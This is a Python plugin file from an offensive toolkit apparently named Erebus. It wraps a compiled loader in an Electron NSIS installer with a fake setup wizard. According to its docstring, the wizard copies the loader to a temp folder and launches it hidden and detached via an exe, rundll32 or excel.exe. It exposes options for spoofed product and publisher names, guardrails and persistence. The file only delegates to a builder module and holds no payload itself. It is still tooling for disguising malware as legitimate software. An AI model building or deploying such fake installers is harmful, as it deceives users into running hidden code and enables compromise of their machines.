"""
Erebus Plugin - Electron Fake-Installer Container

Wraps the compiled loader in ``payload/`` inside an Electron NSIS installer
that presents a fake setup wizard. At install time the wizard copies the
embedded loader tree to ``%TEMP%\\inst-<uuid>`` and spawns the configured
entry point (exe / dll via rundll32 / xll via excel.exe) hidden and detached.
"""

import pathlib
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class ElectronContainerPlugin(ErebusPlugin):
    """Plugin wrapping the Electron fake-installer container builder."""

    def __init__(self):
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.DEFAULT_ROOT = self.REPO_ROOT / "agent_code"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="electron_container",
            version="1.0.0",
            author="Lavender-dll",
            description="Wraps the compiled loader in an Electron fake-installer NSIS",
            category=PluginCategory.CONTAINER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "build_electron_installer": self.build_electron_installer,
        }

    def validate(self) -> tuple[bool, str]:
        try:
            from jinja2 import Environment  # noqa: F401
            return (True, None)
        except ImportError as e:
            return (False, f"Missing required dependency: {e}")

    def on_load(self):
        print("[Plugin] Electron Container plugin loaded")

    def _get_container_electron(self):
        try:
            from .archive import container_electron
        except ImportError:
            from archive import container_electron
        return container_electron

    # ==================== Plugin Functions ====================

    def build_electron_installer(
        self,
        build_path: pathlib.Path,
        product: str = "Acme Installer",
        publisher: str = "Acme Corporation",
        version: str = "1.0.0",
        arch: str = "x64",
        entry_format: str = "exe",
        entry_name: str = "erebus.exe",
        dll_entry: str = "DllMain",
        file_description: str = "Setup",
        copyright_str: str = "",
        custom_icon_bytes: Optional[bytes] = None,
        guardrails: Optional[dict] = None,
        persistence: Optional[dict] = None,
    ) -> pathlib.Path:
        container_electron = self._get_container_electron()
        return container_electron.build_electron_installer(
            build_path=build_path,
            product=product,
            publisher=publisher,
            version=version,
            arch=arch,
            entry_format=entry_format,
            entry_name=entry_name,
            dll_entry=dll_entry,
            file_description=file_description,
            copyright_str=copyright_str,
            custom_icon_bytes=custom_icon_bytes,
            guardrails=guardrails,
            persistence=persistence,
        )


def get_plugin() -> ElectronContainerPlugin:
    return ElectronContainerPlugin()


if __name__ == "__main__":
    _plugin = ElectronContainerPlugin()
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()
    registered = _plugin.register()
    print(f"[*] Registered functions ({len(registered)}):")
    for func_name in sorted(registered.keys()):
        print(f"    - {func_name}")
    is_valid, error = _plugin.validate()
    print("[+] Validation passed" if is_valid else f"[-] Validation failed: {error}")
